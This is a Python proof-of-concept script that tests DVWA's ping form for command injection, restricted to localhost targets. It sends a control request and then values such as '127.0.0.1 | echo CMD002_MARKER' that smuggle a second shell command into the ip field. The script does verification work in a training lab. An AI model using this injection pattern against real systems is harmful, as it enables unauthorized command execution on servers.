#!/usr/bin/env python3
# CMD-002 command-injection verification draft (local authorized lab only).
# Requires an authenticated session cookie and, when enabled, a DVWA CSRF token.
import argparse
import http.cookiejar
import urllib.error
import urllib.parse
import urllib.request

MARKER = 'CMD002_MARKER'
ALLOWED_HOSTS = {'127.0.0.1', 'localhost', '::1'}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, 'redirect blocked: ' + newurl, headers, fp)


def check_target(base_url):
    parsed = urllib.parse.urlparse(base_url)
    if parsed.scheme not in ('http', 'https'):
        raise SystemExit('only http/https targets are allowed')
    if parsed.hostname not in ALLOWED_HOSTS:
        raise SystemExit('only localhost targets are allowed, got: ' + str(parsed.hostname))


def read_token(base_url, opener):
    with opener.open(base_url + '/vulnerabilities/exec/', timeout=10) as resp:
        body = resp.read().decode('utf-8', 'replace')
    idx = body.find('user_token')
    if idx == -1:
        return None
    pos = body.find('value=', idx)
    if pos == -1:
        return None
    quote = body[pos + 6]
    end = body.find(quote, pos + 7)
    if end == -1:
        return None
    return body[pos + 7:end]


def post(opener, url, fields, cookie, token):
    fields = dict(fields)
    if token:
        fields['user_token'] = token
    data = urllib.parse.urlencode(fields).encode('utf-8')
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    if cookie:
        req.add_header('Cookie', cookie)
    try:
        with opener.open(req, timeout=15) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', 'replace')


def build_payload(os_name, marker):
    if os_name == 'windows':
        return '127.0.0.1 & echo ' + marker
    return '127.0.0.1 | echo ' + marker


def parse_pre(body):
    start = body.find('<pre>')
    if start == -1:
        return ''
    end = body.find('</pre>', start)
    if end == -1:
        return ''
    return body[start + 5:end]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--base-url', required=True)
    ap.add_argument('--cookie-file', default=None)
    ap.add_argument('--token', default=None)
    ap.add_argument('--os', choices=['windows', 'linux'], default='linux')
    args = ap.parse_args()
    check_target(args.base_url)
    base = args.base_url.rstrip('/')
    cookie = ''
    if args.cookie_file:
        with open(args.cookie_file, 'r', encoding='utf-8') as fh:
            cookie = fh.read().strip()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()), NoRedirect())
    token = args.token or read_token(base, opener)
    url = base + '/vulnerabilities/exec/'
    status, body = post(opener, url, {'Submit': 'Submit', 'ip': '127.0.0.1'}, cookie, token)
    print('control status:', status)
    print('control pre:', parse_pre(body))
    payload = build_payload(args.os, MARKER)
    status, body = post(opener, url, {'Submit': 'Submit', 'ip': payload}, cookie, token)
    print('test status:', status)
    print('test payload:', payload)
    print('test pre:', parse_pre(body))
    print('marker_seen_in_output:', MARKER in parse_pre(body))


if __name__ == '__main__':
    main()
